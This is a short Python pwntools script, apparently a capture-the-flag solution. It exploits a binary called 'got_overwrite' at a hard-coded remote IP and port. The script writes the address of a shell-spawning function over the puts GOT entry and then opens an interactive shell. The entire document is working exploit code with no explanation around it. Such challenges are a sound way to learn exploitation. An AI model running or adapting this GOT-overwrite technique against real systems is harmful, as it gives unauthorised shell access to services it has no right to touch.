from pwn import *

#elf = ELF('./got_overwrite')
io  = remote('34.146.147.100', 30004)
#io = process('./got_overwrite')

puts_got_addr = 0x601018
call_shell_addr = 0x400697

io.recvuntil('is ')
io.sendline(hex(puts_got_addr))
io.recvuntil('is ')
io.sendline(hex(call_shell_addr))
io.interactive()
